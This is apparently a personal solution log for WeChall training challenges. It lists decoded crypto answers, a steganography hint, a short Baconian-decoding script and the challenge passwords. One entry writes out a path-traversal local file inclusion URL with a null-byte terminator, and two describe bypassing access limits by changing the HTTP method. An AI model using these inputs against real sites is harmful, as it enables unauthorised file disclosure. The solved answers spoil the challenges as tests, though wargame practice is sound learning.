# WeChall Log

### Training - Encodings 1

```
7-bit encoded ascii
```

### Training - PHP LFI

```
http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00
```

### Training - Crypto: Transposition 1

* [http://tholman.com/other/transposition/](http://tholman.com/other/transposition/)

```
214365
Wonderful. You can read the message	way	better when	the	letters	are	in correct order. I	think you would	like to	see	your password now:	dedmblsnbflh.

```

### Training - Crypto: Substitution 1

```
BY THE ALMIGHTY GOD YOU CAN READ THIS MY FRIEND I AM IMPRESSED VERY WELL DONE YOUR SOLUTION KEY IS BONAHGDHHSFA THIS LITTLE CHALLENGE WAS NOT TOO HARD WAS IT
```

### Training - Crypto: Caesar 2

```
FLEFAORMBNNP
```

### Training - LSB

* Use [Stegsolve](https://github.com/zardus/ctf-tools) (Green Plane 1)

```
DFSEDFILDIDC
```

### Training - Baconian

```python
#!/usr/bin/env python

import string

up = string.uppercase
low = string.lowercase

m = open('message').read().strip()

out = ''
for l in m:
    if l in up:
        out += 'B'
    if l in low:
        out += 'A'

print out

# HDIPAGNFBFBS
```

### Limited Access

```
Use Postman Interceptor to send a POST request instead of a GET request.
```

### Limited Access Too

```
Use Postman Interceptor to send a VIEW request instead of a GET request.
```

### Training - Crypto: Substitution 2

```
con~ra~ula~ions' this one was harder. bu~ xou ~o~ i~' ~erx well done fellow hag-er' the problem wi~h ~his gipher is ~ha~ ~he -ex is pre~~x lon~' ; will gome up wi~h a be~~er engrxp~ion sheme anx soon' your solu~ion is: rbdefmdnpdob'

rbdefmdnpdob
```

### Enlightenment

```
Gimme_Da_Light
```

###